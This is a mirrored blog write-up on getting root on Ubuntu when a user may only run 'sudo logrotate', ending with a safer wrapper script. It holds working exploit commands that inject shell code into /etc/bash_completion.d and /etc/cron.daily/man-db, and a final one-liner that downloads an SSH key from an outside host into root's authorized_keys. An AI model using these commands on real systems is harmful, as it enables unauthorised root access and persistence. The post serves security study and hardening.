<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://joshua.hu/gaining-root-with-logrotate-sudo-ubuntu">Original</a>
    <h1>root with a single command: sudo logrotate</h1>
    
    <div id="readability-page-1" class="page"><article>
  <p>The scenario is this: a brand new Ubuntu 22.04 server has an account which is restricted to running <code>sudo logrotate *</code>.  Can we get root? Short answer: Yes. I couldn’t find much online about this type of exploitation of logrotate, so let’s document something for future use.</p>

<hr/>

<p>Note: as mentioned, the <em>user</em> is limited to <em>only</em> running <code>sudo logrotate *</code>. No other command is possible. This could be either through some <code>rbash</code>  setup, some ForceCommand setting in ssh, or something else. The point is: the <em>user</em> cannot run anything other than <code>sudo logrotate</code>:</p>

<p>So we need to find some functionality <strong>built into logrotate</strong> which will let us elevate to unrestricted root.</p>

<hr/>

<p>Let’s first look at logrotate’s help text:</p>
<div><div><pre><code><span>$ </span>logrotate <span>--help</span>
Usage: logrotate <span>[</span>OPTION...] &lt;configfile&gt;
<span>[</span>..]
  <span>-f</span>, <span>--force</span>               Force file rotation
  <span>-m</span>, <span>--mail</span><span>=</span><span>command        </span>Command to send mail <span>(</span>instead of <span>`</span>/usr/bin/mail<span>&#39;)
  -s, --state=statefile     Path of state file
  -l, --log=logfile         Log file or &#39;</span>syslog<span>&#39; to log to syslog
</span></code></pre></div></div>

<p>My first instinct was to use something like <code>sudo logrotate -m &#39;/usr/bin/uname&#39;</code>. The manual states that this flag is for:</p>
<div><div><pre><code>       <span>-m</span>, <span>--mail</span> <span>command
              </span>Tells logrotate which <span>command </span>to use when mailing logs.
</code></pre></div></div>

<p>A logrotate configuration file may specify an email address to send log files when they are rotated:</p>
<div><div><pre><code>       mail address: When a log is rotated out of existence, it is mailed to address.  If no mail should be generated by a particular log, the nomail directive may be used.
       nomail: Do not mail old log files to any address.
       mailfirst: When using the mail command, mail the just-rotated file, instead of the about-to-expire file.
       maillast: When using the mail command, mail the about-to-expire file, instead of the just-rotated file (this is the default).
</code></pre></div></div>

<p>However, no logrotate configuration files were mailing logs:</p>
<div><div><pre><code><span>$ </span><span>grep</span> <span>-nrI</span> <span>&#39;mail&#39;</span> /etc/logrotate.<span>*</span>
<span>$</span>
</code></pre></div></div>

<hr/>

<p>So, why not just create a new configuration? No dice:</p>
<div><div><pre><code><span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>&#39;/usr/bin/uname&#39;</span> ./mail
Potentially dangerous mode on ./mail: 0664
error: Ignoring ./mail because it is writable by group or others.

<span>$ </span><span>chmod </span>600 mail

<span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>&#39;/usr/bin/uname&#39;</span> <span>-f</span> ./mail
error: Ignoring ./mail because the file owner is wrong <span>(</span>should be root or user with uid 0<span>)</span><span>.</span>
</code></pre></div></div>
<p>So we need a very specific type of file: owned by root, and only writable by root. I first thought some log files may work:</p>
<div><div><pre><code><span>-rw-r--r--</span>   1 root      root                   0 Oct  1 00:00 dpkg.log
<span>-rw-r--r--</span>   1 root      root                   0 Oct  1 00:00 alternatives.log
<span>-rw-r-----</span>   1 root      adm                46992 Sep  5 15:48 dmesg
..
</code></pre></div></div>
<p>but I couldn’t find anything that would let me log to the file verbatim, or without any extra characters at the end (due to logrotate’s functionality, we can effectively log to the beginning of many log files too, since we can just rotate the log if there is a configuration file in <em>/etc/logrotate.d/</em> already.)</p>

<hr/>

<p>I then thought <em>/var/mail/root</em>:</p>
<div><div><pre><code><span>$ </span><span>ls</span> <span>-l</span> /var/mail/root
<span>-rw-------</span> 1 root mail 1 Oct  1 01:07 /var/mail/root
</code></pre></div></div>
<p>It definitely fits our requirements. So let’s try:</p>
<div><div><pre><code><span>$ </span><span>cat</span> <span>&lt;&lt;&lt;</span> <span>&#34;/home/user/log.log {
mail address@example.com
}&#34;</span> | mail <span>-s</span> <span>&#34;Email Subject&#34;</span> root

<span>$ </span><span>sudo </span>logrotate <span>-m</span> <span>&#39;/usr/bin/uname&#39;</span> <span>-f</span> /var/mail/root
error: /var/mail/root:1 unknown option <span>&#39;From&#39;</span> <span>--</span> ignoring line
error: /var/mail/root:2 keyword <span>&#39;Return&#39;</span> not properly separated, found 0x2d
</code></pre></div></div>
<p>Unfortunately logrotate completely bawks on the second line in the mail file:</p>
<pre><code>From user@server  Sun Oct  1 01:10:45 2023
Return-Path: &lt;user@server&gt;
X-Original-To: root
Delivered-To: root@server
Received: by server (Postfix, from userid 1000)
	id D689B7E3DD; Sun,  1 Oct 2023 01:10:45 +0000 (UTC)
Subject: Email Subject
To: root@server
User-Agent: mail (GNU Mailutils 3.14)
Date: Sun,  1 Oct 2023 01:10:45 +0000
Message-Id: &lt;20231001011045.D689B7E3DD@server&gt;
From: User &lt;user@server&gt;

/home/user/log.log {
mail address@example.com
}
</code></pre>
<p>So, out of luck here, too.</p>

<hr/>

<p>I moved on to the <code>-s</code> flag that logrotate provides, and while it can create files as root (and overwrite those that exist), it didn’t provide much value:</p>
<div><div><pre><code><span>$ </span><span>ls</span> <span>-l</span> /tmp/test
<span>-rw-r-----</span> 1 root root 29 Oct  1 01:19 /tmp/test

<span>$ </span><span>cat</span> /tmp/test <span># run as root</span>
logrotate state <span>--</span> version 2
</code></pre></div></div>

<hr/>

<p>Finally, I took a look at the <code>-l</code> flag:</p>
<div><div><pre><code><span>$ </span><span>sudo </span>logrotate <span>-l</span> ./nonexist <span>test
</span>error: cannot <span>stat test</span>: No such file or directory

<span>$ </span><span>cat </span>nonexist
error: cannot <span>stat test</span>: No such file or directory
Reading state from file: /var/lib/logrotate/status
Allocating <span>hash </span>table <span>for </span>state file, size 64 entries
Creating new state
<span>[</span>..]

Handling 0 logs

<span>$ </span><span>ls</span> <span>-l</span> nonexist
<span>-rw-r--r--</span> 1 root root 952 Oct  1 01:28 nonexist
</code></pre></div></div>
<p>So we can write arbitrary data (<strong>test</strong> here is the arbitrary data, albeit with some garbage between it) to an arbitrary file which is owned by root. What more can we do with this?</p>
<div><div><pre><code>user@server:/etc/bash_completion.d<span>$ </span><span>ls</span> <span>-l</span>
total 4
<span>-rw-r--r--</span> 1 root root 439 Feb 28  2023 git-prompt

user@server:/etc/bash_completion.d<span>$ </span><span>sudo </span>logrotate <span>-l</span> /etc/bash_completion.d/backdoor <span>&#39;2&gt;/dev/null;uname -a; return 0;&#39;</span>
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>return </span>0<span>;</span>: No such file or directory

user@server:/etc/bash_completion.d<span>$ </span><span>ls</span> <span>-l</span>
total 8
<span>-rw-r--r--</span> 1 root root 652 Sep 30 14:35 backdoor
<span>-rw-r--r--</span> 1 root root 439 Feb 28  2023 git-prompt

user@server:/etc/bash_completion.d<span>$ </span><span>cat </span>backdoor
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>return </span>0<span>;</span>: No such file or directory
acquired lock on state file /var/lib/logrotate/statusReading state from file: /var/lib/logrotate/status
Allocating <span>hash </span>table <span>for </span>state file, size 64 entries
Creating new state
<span>[</span>..]

user@server:/etc/bash_completion.d<span>$ </span><span>exit
logout
</span>Shared connection to server closed.

<span>$ </span>ssh user@server
Last login: Sat Sep 30 14:33:20 2023 from 10.0.0.0
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<p>Basically, we can create an arbitrary file in <code>/etc/bash_completion.d/</code> which, if bash completion is enabled, will be sourced when a user logs into the server. The arbitrary data is <code>2&gt;/dev/null;uname -a; return 0;</code> which effectively sends the first garbage data to <em>/dev/null</em>; executes <code>uname -a</code>; then returns, ignoring the rest of the junk data. This could be used to get a shell when a real user logs into the server, hopefully obtaining more access. Alternatively, we could create some file in <em>/etc/init.d/</em>, <em>/etc/profile.d/</em>, or overwrite <em>/etc/profile</em>. The possibilities are endless.</p>

<hr/>

<p>I wasn’t happy with leaving it like this, so I took a further look. As it turns out, the permissions of the log files are retained too:</p>
<div><div><pre><code><span>$ </span><span>touch </span>check-perms
<span>$ </span><span>chmod </span>777 check-perms
<span>$ </span><span>sudo </span>logrotate <span>-l</span> ./check-perms <span>test
</span>error: cannot <span>stat test</span>: No such file or directory

<span>$ </span><span>ls</span> <span>-l</span> check-perms
<span>-rwxrwxrwx</span> 1 user user 952 Oct  1 01:32 check-perms
</code></pre></div></div>
<p>What can we do with this?</p>

<p>Well, we can edit one of the scripts in <em>/etc/cron.daily/</em>:</p>
<div><div><pre><code>user@server:/etc/cron.daily<span>$ </span><span>ls</span> <span>-l</span> man-db
<span>-rwxr-xr-x</span> 1 root root 1395 Mar 12  2023 man-db

user@server:/etc/cron.daily<span>$ </span><span>sudo </span>logrotate <span>-l</span> /etc/cron.daily/man-db <span>&#39;2&gt;/dev/null;uname -a; exit 0;&#39;</span>
error: cannot <span>stat </span>2&gt;/dev/null<span>;</span><span>uname</span> <span>-a</span><span>;</span> <span>exit </span>0<span>;</span>: No such file or directory

user@server:/etc/cron.daily<span>$ </span><span>ls</span> <span>-l</span> man-db
<span>-rwxr-xr-x</span> 1 root root 652 Sep 30 14:50 man-db

user@server:/etc/cron.daily<span>$ </span>./man-db
Linux server 5.15.0-83-generic <span>#92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>
<p>The next time the cronjob runs, our arbitrary code is executed: as root.</p>

<hr/>

<p>So, to answer the question: with only the <code>sudo logrotate</code> command available, can we obtain root? Yep; it’s as simple as:</p>
<div><div><pre><code><span>sudo </span>logrotate <span>-l</span> /etc/cron.daily/man-db <span>&#39;2&gt;/dev/null;wget host/ssh.key -O /root/.ssh/authorized_keys2; exit 0;&#39;</span>
</code></pre></div></div>
<p>then wait until the cronjob is run, and just ssh in. That’s my solution to this problem, anyways.</p>

<hr/>

<p>And of course, the slightly more appropriate way to achieve the goal of allowing a normal user to rotate logs would be to allow sudo to run a wrapper script like this:</p>
<div><div><pre><code><span>#!/bin/sh</span>
<span>case</span> <span>&#34;</span><span>$1</span><span>&#34;</span> <span>in</span>
    <span>[</span>a-z0-9A-Z<span>\-</span><span>]</span><span>)</span>
       /usr/sbin/logrotate <span>-f</span> /etc/logrotate.d/<span>&#34;</span><span>$1</span><span>&#34;</span>
        <span>;;</span>
    <span>*</span><span>)</span>
        <span>exit </span>1
        <span>;;</span>
<span>esac</span>
</code></pre></div></div>

</article></div>
  </body>
</html>
